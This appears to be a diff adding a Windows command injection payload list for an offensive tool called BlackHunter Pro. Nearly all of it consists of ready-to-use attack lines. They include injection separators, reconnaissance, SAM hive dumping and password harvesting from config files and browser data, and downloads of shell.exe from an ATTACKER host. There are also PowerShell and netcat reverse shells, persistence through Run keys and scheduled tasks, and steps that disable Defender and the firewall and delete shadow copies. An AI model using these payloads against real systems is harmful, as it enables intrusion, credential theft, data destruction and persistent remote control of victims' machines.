@@ -1,0 +1,431 @@
+# payloads/cmdi/windows.txt
+# Windows Command Injection Payloads
+# BlackHunter Pro
+
+# =============================================
+# SEPARATORS
+# =============================================
+
+& whoami
+| whoami
+|| whoami
+&& whoami
+; whoami
+%0awhoami
+%0dwhoami
+%0d%0awhoami
+
+# =============================================
+# BASIC COMMANDS - WITH AMPERSAND
+# =============================================
+
+& whoami
+& hostname
+& ver
+& systeminfo
+& ipconfig
+& ipconfig /all
+& net user
+& net localgroup
+& net localgroup administrators
+& net share
+& net start
+& tasklist
+& tasklist /svc
+& dir
+& dir C:\
+& dir C:\Users
+& type C:\Windows\win.ini
+& type C:\boot.ini
+
+# =============================================
+# BASIC COMMANDS - WITH PIPE
+# =============================================
+
+| whoami
+| hostname
+| ver
+| systeminfo
+| ipconfig
+| ipconfig /all
+| net user
+| net localgroup
+| net localgroup administrators
+| net share
+| net start
+| tasklist
+| tasklist /svc
+| dir
+| dir C:\
+| type C:\Windows\win.ini
+| type C:\boot.ini
+
+# =============================================
+# BASIC COMMANDS - WITH DOUBLE AMPERSAND
+# =============================================
+
+&& whoami
+&& hostname
+&& ver
+&& systeminfo
+&& ipconfig
+&& ipconfig /all
+&& net user
+&& net localgroup administrators
+&& tasklist
+&& dir
+&& type C:\Windows\win.ini
+
+# =============================================
+# BASIC COMMANDS - WITH DOUBLE PIPE
+# =============================================
+
+|| whoami
+|| hostname
+|| ver
+|| systeminfo
+|| ipconfig
+|| net user
+|| tasklist
+|| dir
+
+# =============================================
+# SYSTEM INFO
+# =============================================
+
+& whoami
+& whoami /priv
+& whoami /groups
+& whoami /all
+& hostname
+& ver
+& systeminfo
+& systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+& systeminfo | findstr /B /C:"Host Name"
+& wmic os get Caption,Version,BuildNumber /value
+& wmic os get OSArchitecture
+& wmic computersystem get Name,Domain,Manufacturer,Model
+& wmic bios get SerialNumber
+& wmic csproduct get UUID
+& echo %USERNAME%
+& echo %USERDOMAIN%
+& echo %COMPUTERNAME%
+& echo %OS%
+& echo %PROCESSOR_ARCHITECTURE%
+
+# =============================================
+# USER INFO
+# =============================================
+
+& net user
+& net user administrator
+& net user %USERNAME%
+& net localgroup
+& net localgroup administrators
+& net localgroup "Remote Desktop Users"
+& net accounts
+& net share
+& net session
+& net config workstation
+& query user
+& qwinsta
+& whoami /priv
+& whoami /groups
+& whoami /all
+
+# =============================================
+# NETWORK INFO
+# =============================================
+
+& ipconfig
+& ipconfig /all
+& ipconfig /displaydns
+& ipconfig /flushdns
+& netstat -an
+& netstat -ano
+& netstat -b
+& netstat -r
+& route print
+& arp -a
+& nslookup google.com
+& nslookup ATTACKER
+& ping -n 1 ATTACKER
+& tracert ATTACKER
+& net view
+& net view /domain
+& net use
+& net share
+& netsh firewall show state
+& netsh advfirewall show allprofiles
+& netsh wlan show profiles
+& netsh wlan show profile name="WiFi" key=clear
+
+# =============================================
+# PROCESS INFO
+# =============================================
+
+& tasklist
+& tasklist /svc
+& tasklist /v
+& tasklist /m
+& tasklist /fi "imagename eq explorer.exe"
+& tasklist /fi "status eq running"
+& wmic process list brief
+& wmic process get name,processid,executablepath
+& wmic process where "name='cmd.exe'" get processid
+& taskkill /F /IM notepad.exe
+& taskkill /F /PID 1234
+& sc query
+& sc query state= all
+& sc qc wuauserv
+& net start
+& net stop "Windows Update"
+& wmic service list brief
+& wmic startup list full
+
+# =============================================
+# FILESYSTEM
+# =============================================
+
+& dir
+& dir /a
+& dir /s
+& dir C:\
+& dir C:\Users
+& dir C:\Users\Administrator
+& dir C:\Users\Administrator\Desktop
+& dir C:\Users\Administrator\Documents
+& dir C:\Users\Administrator\Downloads
+& dir C:\inetpub\wwwroot
+& dir C:\xampp
+& dir C:\Windows\Temp
+& dir C:\Temp
+& type C:\Windows\win.ini
+& type C:\boot.ini
+& type C:\Windows\System32\drivers\etc\hosts
+& type C:\inetpub\wwwroot\web.config
+& type C:\xampp\apache\conf\httpd.conf
+& type C:\xampp\php\php.ini
+& type C:\Windows\System32\inetsrv\config\applicationHost.config
+& findstr /si password *.txt
+& findstr /si password *.xml
+& findstr /si password *.config
+& findstr /si password *.ini
+& findstr /si password *.php
+
+# =============================================
+# REGISTRY
+# =============================================
+
+& reg query HKLM\Software
+& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
+& reg query HKLM\SYSTEM\CurrentControlSet\Control\ComputerName
+& reg query HKLM\SAM
+& reg query HKLM\SECURITY
+& reg query HKLM\SYSTEM
+& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer
+& reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+& reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
+& reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
+& reg save HKLM\SAM C:\Windows\Temp\sam.hiv && reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
+
+# =============================================
+# INSTALLED SOFTWARE
+# =============================================
+
+& wmic product get name,version
+& wmic product get name,version,vendor
+& wmic qfe get hotfixid
+& wmic qfe list brief
+& dir "C:\Program Files"
+& dir "C:\Program Files (x86)"
+& dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
+& dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs"
+
+# =============================================
+# CREDENTIAL HARVESTING
+# =============================================
+
+& dir C:\Windows\System32\config\SAM
+& dir C:\Windows\System32\config\SYSTEM
+& dir C:\Windows\System32\config\SECURITY
+& dir C:\Windows\repair\SAM
+& dir C:\Windows\repair\SYSTEM
+& dir C:\Windows\Panther\Unattend.xml
+& dir C:\Windows\Panther\Unattended.xml
+& type C:\Windows\Panther\Unattend.xml
+& type C:\Windows\Panther\Unattended.xml
+& findstr /si password C:\Windows\Panther\*.xml
+& findstr /si password C:\inetpub\wwwroot\*.config
+& findstr /si password C:\xampp\*.ini
+& findstr /si password C:\Users\Administrator\*.txt
+& findstr /si "password" C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+& type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+# =============================================
+# BROWSER DATA
+# =============================================
+
+& dir C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default
+& dir C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default
+& dir C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles
+& type C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data
+& type C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies
+& copy C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data C:\Temp\login.db
+
+# =============================================
+# FILE TRANSFER
+# =============================================
+
+& certutil -urlcache -f http://ATTACKER/shell.exe C:\Temp\shell.exe
+& certutil -urlcache -split -f http://ATTACKER/shell.exe C:\Temp\shell.exe
+& bitsadmin /transfer job http://ATTACKER/shell.exe C:\Temp\shell.exe
+& powershell -c "IWR http://ATTACKER/shell.exe -OutFile C:\Temp\shell.exe"
+& powershell -c "IEX(IWR http://ATTACKER/shell.ps1 -UseBasicParsing)"
+& powershell -c "IWR http://ATTACKER/shell.ps1 -UseBasicParsing | IEX"
+& curl http://ATTACKER/shell.exe -o C:\Temp\shell.exe
+& wget http://ATTACKER/shell.exe -O C:\Temp\shell.exe
+& copy \\ATTACKER\share\shell.exe C:\Temp\shell.exe
+& xcopy \\ATTACKER\share\shell.exe C:\Temp\
+& robocopy \\ATTACKER\share C:\Temp shell.exe
+
+# =============================================
+# REVERSE SHELLS
+# =============================================
+
+& powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-PowerShellTcp.ps1')"
+
+& powershell -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+
+& nc -e cmd.exe ATTACKER 4444
+& nc.exe -e cmd.exe ATTACKER 4444
+& ncat -e cmd.exe ATTACKER 4444
+
+# =============================================
+# PERSISTENCE
+# =============================================
+
+& reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Temp\shell.exe" /f
+& reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Temp\shell.exe" /f
+& schtasks /create /tn "Update" /tr "C:\Temp\shell.exe" /sc minute /mo 5 /f
+& schtasks /create /tn "Update" /tr "powershell -c IEX(IWR http://ATTACKER/shell.ps1)" /sc minute /mo 5 /f
+& schtasks /create /tn "WindowsUpdate" /tr "cmd /c C:\Temp\shell.exe" /sc onlogon /f
+& copy C:\Temp\shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+& copy C:\Temp\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+
+# =============================================
+# DEFENSE EVASION
+# =============================================
+
+& netsh advfirewall set allprofiles state off
+& netsh firewall set opmode disable
+& sc stop WinDefend
+& sc config WinDefend start= disabled
+& sc stop wuauserv
+& sc config wuauserv start= disabled
+& reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+& powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
+& powershell -c "Add-MpPreference -ExclusionPath C:\Temp"
+& vssadmin delete shadows /all /quiet
+& wbadmin delete catalog -quiet
+
+# =============================================
+# WAF BYPASS TECHNIQUES
+# =============================================
+
+& whoami
+& w"h"o"a"m"i
+& wh^oami
+& wh""oami
+& who^ami
+& whoami
+& %COMSPEC% /c whoami
+& cmd /c whoami
+& cmd.exe /c whoami
+& cmd /c "whoami"
+& cm^d /c whoami
+& whoami%00
+& whoami%00.exe
+& whoami.& whoami
+& whoami& whoami
+& whoami&& whoami
+& whoami|| whoami
+& (whoami)
+& %USERNAME%
+& %USERPROFILE%
+& %COMPUTERNAME%
+& %OS%
+& %PROCESSOR_ARCHITECTURE%
+
+# =============================================
+# COMMAND SUBSTITUTION
+# =============================================
+
+& %OS%
+& %USERNAME%
+& %COMPUTERNAME%
+& %USERPROFILE%
+& %APPDATA%
+& %TEMP%
+& %PATH%
+& %CD%
+& %DATE%
+& %TIME%
+
+# =============================================
+# SPECIAL CHARACTERS
+# =============================================
+
+%0awhoami
+%0dwhoami
+%0d%0awhoami
+%09whoami
+%20whoami
+%26whoami
+%26%26whoami
+%7Cwhoami
+%7C%7Cwhoami
+%3Bwhoami
+
+# =============================================
+# COMMAND CHAINING
+# =============================================
+
+& whoami & hostname & ipconfig
+& whoami && hostname && ipconfig
+& whoami; hostname; ipconfig
+& dir C:\ & whoami & ipconfig
+& type C:\Windows\win.ini & whoami
+& net user & whoami & hostname
+
+# =============================================
+# POWERSHELL ONE-LINERS
+# =============================================
+
+& powershell -c "Get-Process"
+& powershell -c "Get-Service"
+& powershell -c "Get-ChildItem -Path C:\ -Recurse -Filter *.config"
+& powershell -c "Get-ChildItem -Path C:\Users -Recurse -Filter *.txt"
+& powershell -c "Get-Content C:\Windows\win.ini"
+& powershell -c "Get-Content C:\boot.ini"
+& powershell -c "Get-WmiObject -Class Win32_ComputerSystem"
+& powershell -c "Get-LocalUser"
+& powershell -c "Get-LocalGroup"
+& powershell -c "Get-LocalGroupMember Administrators"
+& powershell -c "Get-Process | Where-Object {$_.ProcessName -like '*chrome*'}"
+& powershell -c "Get-NetTCPConnection -State Listen"
+& powershell -c "Get-NetFirewallProfile"
+& powershell -c "Get-MpComputerStatus"
+& powershell -c "Get-HotFix"
+& powershell -c "Get-ChildItem Env:"
+& powershell -c "Get-EventLog -LogName Security -Newest 10"
+& powershell -c "Get-Volume"
+& powershell -c "Get-Disk"
+& powershell -c "Get-ComputerInfo"
+& powershell -c "Test-NetConnection -ComputerName ATTACKER -Port 4444"
